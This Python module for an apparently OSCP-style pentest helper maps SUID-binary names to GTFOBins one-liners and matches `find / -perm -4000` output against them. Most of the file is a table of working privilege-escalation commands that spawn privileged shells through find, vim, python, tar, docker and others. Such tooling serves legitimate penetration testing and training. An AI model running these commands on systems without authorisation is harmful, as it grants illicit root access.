from __future__ import annotations
from pathlib import Path

# Curated subset of GTFOBins entries that document a "SUID" abuse technique
# (https://gtfobins.github.io) -- the binaries that actually show up on
# OSCP-style boxes' `find / -perm -4000` output often enough to be worth
# hardcoding, rather than the full ~1000-entry catalog. This is a static
# reference lookup only: it matches binary names, it does not execute
# anything.
GTFOBINS_SUID: dict[str, str] = {
    "find": "find . -exec /bin/sh -p \\; -quit",
    "vim": "vim -c ':!/bin/sh'",
    "vi": "vi -c ':!/bin/sh'",
    "less": "less /etc/profile\n!/bin/sh",
    "more": "more /etc/profile\n!/bin/sh",
    "man": "man man\n!/bin/sh",
    "awk": "awk 'BEGIN {system(\"/bin/sh -p\")}'",
    "perl": "perl -e 'exec \"/bin/sh\", \"-p\";'",
    "python": "python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
    "python2": "python2 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
    "python3": "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
    "ruby": "ruby -e 'exec \"/bin/sh -p\"'",
    "php": "php -r \"pcntl_exec('/bin/sh', ['-p']);\"",
    "node": "node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0,1,2]})'",
    "lua": "lua -e 'os.execute(\"/bin/sh -p\")'",
    "lua5.1": "lua5.1 -e 'os.execute(\"/bin/sh -p\")'",
    "bash": "bash -p",
    "sh": "sh -p",
    "dash": "dash -p",
    "tar": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
    "zip": 'zip /tmp/x.zip /etc/hosts -T --unzip-command="sh -c /bin/sh"',
    "gdb": "gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit",
    "env": "env /bin/sh -p",
    "xargs": "xargs -a /dev/null sh -p",
    "git": "git -p help config\n!/bin/sh",
    "socat": "socat stdin exec:/bin/sh -p",
    "expect": "expect -c 'spawn /bin/sh -p;interact'",
    "ftp": "ftp\n!/bin/sh",
    "mysql": "mysql -e '\\! /bin/sh'",
    "nmap": "echo 'os.execute(\"/bin/sh -p\")' > /tmp/x.nse && nmap --script=/tmp/x.nse",
    "docker": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
    "nano": "nano\n^R^X\nreset; sh -p 1>&0 2>&0",
    "rsync": "rsync -e 'sh -p -c \"sh -p 0<&2 1>&2\"' 127.0.0.1:/dev/null",
}
GTFOBINS_URL = "https://gtfobins.github.io/gtfobins/{name}/#suid"


def match_gtfobins(raw: str) -> list[dict]:
    """Matches each path in `find / -perm -4000`-style output against the
    known-SUID-exploitable binary names above, by basename. Lines that
    aren't paths (blank lines, `find`'s own "Permission denied" stderr,
    a leading legend/header) are silently skipped rather than rejected."""
    seen: dict[str, dict] = {}
    for line in raw.splitlines():
        candidate = line.strip()
        if not candidate.startswith("/"):
            continue
        name = Path(candidate).name
        if name in GTFOBINS_SUID and candidate not in seen:
            seen[candidate] = {
                "path": candidate, "binary": name,
                "command": GTFOBINS_SUID[name],
                "reference": GTFOBINS_URL.format(name=name),
            }
    return list(seen.values())
